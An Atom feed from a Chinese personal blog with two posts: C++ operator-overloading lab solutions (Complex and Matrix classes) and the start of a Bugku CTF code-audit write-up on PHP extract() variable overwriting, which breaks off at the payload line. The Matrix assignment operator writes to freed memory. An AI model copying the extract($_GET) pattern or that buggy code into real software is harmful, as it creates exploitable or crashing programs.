<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>晨曦远的博客</title>
  
  <subtitle>诗酒趁年华</subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="%5Bobject%20Object%5D" rel="hub"/>
  <link href="http://chenxiyuan.vip/"/>
  <updated>2019-05-13T08:43:06.395Z</updated>
  <id>http://chenxiyuan.vip/</id>
  
  <author>
    <name>晨曦远</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>c++多态性</title>
    <link href="http://chenxiyuan.vip/2019/05/13/c-%E5%A4%9A%E6%80%81%E6%80%A7/"/>
    <id>http://chenxiyuan.vip/2019/05/13/c-多态性/</id>
    <published>2019-05-13T08:35:52.000Z</published>
    <updated>2019-05-13T08:43:06.395Z</updated>
    
    <content type="html"><![CDATA[<h1 id="南邮关于c-多态性的上机题，写的时候还是遇到了很多问题的。"><a href="#南邮关于c-多态性的上机题，写的时候还是遇到了很多问题的。" class="headerlink" title="南邮关于c++多态性的上机题，写的时候还是遇到了很多问题的。"></a>南邮关于c++多态性的上机题，写的时候还是遇到了很多问题的。</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>定义复数类Complex，有实部、虚部两个私有成员变量，在该类中定义多个重载的构造函数、定义析构函数和输出函数print，复数的输出形如12-3i，在类中重载+、−、*、/、++（分前++和后++）。在主函数（直接用实验教材P210代码）中定义复数类的对象，实现复数的各种算术运算，通过重载实现静态多态性。<br><a id="more"></a><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Complex</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="keyword">float</span> real;</span><br><span class="line"><span class="keyword">float</span> imag;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Complex(<span class="keyword">float</span> r=<span class="number">0</span>,<span class="keyword">float</span> i=<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">friend</span> Complex <span class="keyword">operator</span> + (<span class="keyword">const</span> Complex &amp;a,<span class="keyword">const</span> Complex &amp;b);</span><br><span class="line"><span class="keyword">friend</span> Complex <span class="keyword">operator</span> - (<span class="keyword">const</span> Complex &amp;a,<span class="keyword">const</span> Complex &amp;b);</span><br><span class="line"><span class="keyword">friend</span> Complex <span class="keyword">operator</span> ++ (Complex &amp;a);</span><br><span class="line">Complex <span class="keyword">operator</span> ++ (<span class="keyword">int</span>);</span><br><span class="line">Complex <span class="keyword">operator</span> * (<span class="keyword">const</span> Complex &amp;b);</span><br><span class="line">Complex <span class="keyword">operator</span> / (<span class="keyword">const</span> Complex &amp;b);</span><br><span class="line">&#125;;</span><br><span class="line">Complex::Complex(<span class="keyword">float</span> r,<span class="keyword">float</span> i)</span><br><span class="line">&#123;</span><br><span class="line">real=r;</span><br><span class="line">imag=i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> Complex::print()</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;real;</span><br><span class="line"><span class="keyword">if</span>(imag!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(imag&gt;<span class="number">0</span>)<span class="built_in">cout</span>&lt;&lt;<span class="string">"+"</span>;<span class="built_in">cout</span>&lt;&lt;imag&lt;&lt;<span class="string">"i"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">Complex <span class="keyword">operator</span> + (<span class="keyword">const</span> Complex &amp;a,<span class="keyword">const</span> Complex &amp;b)</span><br><span class="line">&#123;</span><br><span class="line">Complex temp;</span><br><span class="line">temp.real=a.real+b.real;</span><br><span class="line">temp.imag=a.imag+b.imag;</span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line">Complex <span class="keyword">operator</span> - (<span class="keyword">const</span> Complex &amp;a,<span class="keyword">const</span> Complex &amp;b)</span><br><span class="line">&#123;</span><br><span class="line">Complex temp;</span><br><span class="line">temp.real=a.real-b.real;</span><br><span class="line">temp.imag=a.imag-b.imag;</span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line">Complex <span class="keyword">operator</span> ++(Complex &amp;a)</span><br><span class="line">&#123;</span><br><span class="line">++a.real;</span><br><span class="line">++a.imag;</span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Complex Complex::<span class="keyword">operator</span> ++ (<span class="keyword">int</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="function">Complex <span class="title">temp</span><span class="params">(*<span class="keyword">this</span>)</span></span>;</span><br><span class="line">real++;</span><br><span class="line">imag++;</span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line">Complex Complex::<span class="keyword">operator</span> * (<span class="keyword">const</span> Complex &amp;b)</span><br><span class="line">&#123;</span><br><span class="line">Complex temp;</span><br><span class="line">temp.real=<span class="keyword">this</span>-&gt;real*b.real-<span class="keyword">this</span>-&gt;imag*b.imag;</span><br><span class="line">temp.imag=<span class="keyword">this</span>-&gt;real*b.imag+<span class="keyword">this</span>-&gt;imag*b.real;</span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Complex Complex::<span class="keyword">operator</span> / (<span class="keyword">const</span> Complex &amp;b)</span><br><span class="line">&#123;</span><br><span class="line">Complex temp;</span><br><span class="line">temp.real=(<span class="keyword">this</span>-&gt;real*b.real+<span class="keyword">this</span>-&gt;imag*b.imag)/(b.real*b.real+b.imag*b.imag);</span><br><span class="line">temp.imag=(<span class="keyword">this</span>-&gt;imag*b.real-<span class="keyword">this</span>-&gt;real*b.imag)/(b.real*b.real+b.imag*b.imag);</span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Complex A1(2.3,4.6),A2(3.6,2.8);</span><br><span class="line">Complex A3,A4,A5,A6;</span><br><span class="line">A3=A1+A2;</span><br><span class="line">A4=A1-A2;</span><br><span class="line">A5=A1*A2;</span><br><span class="line">A6=A1/A2;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"A1="</span>;</span><br><span class="line">A1.print();</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">"A2="</span>;</span><br><span class="line">A2.print();</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">"A3=A1+A2="</span>;</span><br><span class="line">A3.print();</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">"A4=A1-A2="</span>;</span><br><span class="line">A4.print();</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">"A5=A1*A2="</span>;</span><br><span class="line">A5.print();</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">"A6=A1/A2="</span>;</span><br><span class="line">A6.print();</span><br><span class="line">A3=++A1;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">"after A3=++A1"</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"A1="</span>;</span><br><span class="line">A1.print();</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"A3="</span>;</span><br><span class="line">A3.print();</span><br><span class="line">A4=A2++;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">"after A4=A2++"</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"A2="</span>;</span><br><span class="line">A2.print();</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"A4="</span>;</span><br><span class="line">A4.print();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>设计一个矩阵类，要求矩阵类中重载运算符加（＋）和赋值（＝），主函数定义类对象并调用重载的运算符。</p><p>提示： (1) 本题考虑可加（即加与被加矩阵的行列数必须分别相等）和可赋值（等号左值的行列数变为右值的行列数）情况，其他情况输出“ program terminated! ”<br>(2) 要求分别输入矩阵 am 和 bm 的行列数，各矩阵元素，分别计算 cm=am+bm;am=bm; 并进行输出<br>(3) 定义相应的构造函数和析构函数<br>(4) 类中的成员变量应当有三个：int row,co请动态空间，存放row*col个整数<br>(5) 程l;分别表示矩阵的行数和列数，另外还需要定义一个一级指针或二级指针用来申序最前面的文件包含请用下面代码：</p><p>#include <iostream></iostream></p><p>#include &lt;stdlib.h&gt;<br>using namespace std;<br>(6)main()已给出，请直接复制使用<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> row_a,col_a,row_b,col_b;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入am矩阵的行数和列数:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;row_a&gt;&gt;col_a;</span><br><span class="line"><span class="function">Matrix <span class="title">am</span><span class="params">(row_a,col_a)</span></span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入bm矩阵的行数和列数:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;row_b&gt;&gt;col_b;</span><br><span class="line">Matrix bm(row_b,col_b),cm;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"am:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">am.disp();</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"bm:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">bm.disp();</span><br><span class="line">cm=am+bm;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"cm=am+bm:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">cm.disp();</span><br><span class="line">am=bm;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"am=bm:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">am.disp();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>(7)类的成员函数disp的代码已给出，请直接复制使用：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> Matrix::disp()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;row;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">'\t'</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;col;j++)</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;*(m+i*col+j)&lt;&lt;<span class="string">'\t'</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>最后代码<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Matrix</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="keyword">int</span> *m;</span><br><span class="line"><span class="keyword">int</span> row;</span><br><span class="line"><span class="keyword">int</span> col;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Matrix(<span class="keyword">int</span> r=<span class="number">0</span>,<span class="keyword">int</span> c=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">row=r;</span><br><span class="line">col=c;</span><br><span class="line">m= <span class="keyword">new</span> <span class="keyword">int</span>[row*col];</span><br><span class="line"><span class="keyword">if</span>(row!=<span class="number">0</span>&amp;&amp;col!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入该矩阵元素:"</span> &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;r*c;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;*(m+i);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">~Matrix()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">delete</span> [] m; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">disp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;row;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">'\t'</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;col;j++)</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;*(m+i*col+j)&lt;&lt;<span class="string">'\t'</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">friend</span> Matrix <span class="keyword">operator</span> + ( <span class="keyword">const</span> Matrix &amp;A, <span class="keyword">const</span> Matrix &amp;B);</span><br><span class="line"></span><br><span class="line">    Matrix &amp; <span class="keyword">operator</span> = (<span class="keyword">const</span> Matrix &amp;B)</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span>((<span class="keyword">this</span>-&gt;row==<span class="number">0</span>)&amp;&amp;(<span class="keyword">this</span>-&gt;col==<span class="number">0</span>))<span class="comment">//用来判断cm=am+bm这种情形 </span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;row=B.row;</span><br><span class="line"><span class="keyword">this</span>-&gt;col=B.col;</span><br><span class="line">m= <span class="keyword">new</span> <span class="keyword">int</span>[row*col];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;(B.row*B.col);i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;m[i]=B.m[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(((<span class="keyword">this</span>-&gt;row==B.row)&amp;&amp;(<span class="keyword">this</span>-&gt;col==B.col)))<span class="comment">//判断am=bm这种情形 </span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">delete</span> [] m;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;(B.row*B.col);i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;m[i]=B.m[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"program terminated!"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Matrix <span class="keyword">operator</span> +(<span class="keyword">const</span> Matrix&amp; A,<span class="keyword">const</span> Matrix&amp; B)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">Matrix C;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((A.row==B.row)&amp;&amp;(A.col==B.col))</span><br><span class="line">&#123;</span><br><span class="line">C.row=A.row;</span><br><span class="line">C.col=A.col;</span><br><span class="line">C.m=<span class="keyword">new</span> <span class="keyword">int</span>[(C.row*C.col)];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;(A.row*A.col);i++)</span><br><span class="line">&#123;</span><br><span class="line">C.m[i]=A.m[i]+B.m[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"program terminated!"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> C;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> row_a,col_a,row_b,col_b;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入am矩阵的行数和列数:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;row_a&gt;&gt;col_a;</span><br><span class="line"><span class="function">Matrix <span class="title">am</span><span class="params">(row_a,col_a)</span></span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入bm矩阵的行数和列数:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;row_b&gt;&gt;col_b;</span><br><span class="line">Matrix bm(row_b,col_b),cm;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"am:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">am.disp();</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"bm:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">bm.disp();</span><br><span class="line">cm=am+bm;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"cm=am+bm:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">cm.disp();</span><br><span class="line">am=bm;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"am=bm:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">am.disp();</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;南邮关于c-多态性的上机题，写的时候还是遇到了很多问题的。&quot;&gt;&lt;a href=&quot;#南邮关于c-多态性的上机题，写的时候还是遇到了很多问题的。&quot; class=&quot;headerlink&quot; title=&quot;南邮关于c++多态性的上机题，写的时候还是遇到了很多问题的。&quot;&gt;&lt;/a&gt;南邮关于c++多态性的上机题，写的时候还是遇到了很多问题的。&lt;/h1&gt;&lt;h2 id=&quot;1&quot;&gt;&lt;a href=&quot;#1&quot; class=&quot;headerlink&quot; title=&quot;1&quot;&gt;&lt;/a&gt;1&lt;/h2&gt;&lt;p&gt;定义复数类Complex，有实部、虚部两个私有成员变量，在该类中定义多个重载的构造函数、定义析构函数和输出函数print，复数的输出形如12-3i，在类中重载+、−、*、/、++（分前++和后++）。在主函数（直接用实验教材P210代码）中定义复数类的对象，实现复数的各种算术运算，通过重载实现静态多态性。&lt;br&gt;
    
    </summary>
    
    
      <category term="c++" scheme="http://chenxiyuan.vip/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>简单的代码审计</title>
    <link href="http://chenxiyuan.vip/2019/04/25/%E7%AE%80%E5%8D%95%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>http://chenxiyuan.vip/2019/04/25/简单的代码审计/</id>
    <published>2019-04-25T11:27:08.000Z</published>
    <updated>2019-05-07T12:46:01.927Z</updated>
    
    <content type="html"><![CDATA[<h1 id="bugku里一些简单的代码审计题"><a href="#bugku里一些简单的代码审计题" class="headerlink" title="bugku里一些简单的代码审计题"></a>bugku里一些简单的代码审计题</h1><h2 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h2><p><a href="http://123.206.87.240:9009/1.php" target="_blank" rel="noopener">http://123.206.87.240:9009/1.php</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">'xxx'</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($shiyan))</span><br><span class="line">&#123;</span><br><span class="line">$content=trim(file_get_contents($flag));</span><br><span class="line"><span class="keyword">if</span>($shiyan==$content)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">'flag&#123;xxx&#125;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">'Oh.no'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>首先extract函数用来将变量从数组中导入到当前的符号表中。这里要让$shiyan==$content,那么只要给$flag和$shiyan变量同时传入空值即可。</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">payload:</span>shiyan=<span 